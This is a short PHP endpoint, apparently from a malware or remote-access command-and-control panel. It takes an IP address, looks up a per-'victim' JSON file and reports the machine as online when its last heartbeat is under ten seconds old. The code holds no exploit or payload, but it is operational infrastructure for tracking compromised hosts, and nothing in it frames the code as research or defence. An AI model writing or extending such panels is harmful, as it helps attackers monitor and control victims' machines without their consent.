<?php
require_once 'functions.php';

header('Content-Type: text/plain');
header('Cache-Control: no-cache, no-store, must-revalidate');

$ip = isset($_GET['ip']) ? $_GET['ip'] : '';

// Sanitize IP
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    echo 'offline';
    exit;
}

// Get victim file path
$file = get_victim_file_path($ip);

$is_online = false;

if (file_exists($file)) {
    $data = @json_decode(@file_get_contents($file), true);
    if (is_array($data)) {
        $last_heartbeat = isset($data['last_heartbeat']) ? $data['last_heartbeat'] : 0;
        
        // Consider online if heartbeat within last 10 seconds
        $is_online = (time() - $last_heartbeat) < 10;
    }
}

echo $is_online ? 'online' : 'offline';
?>
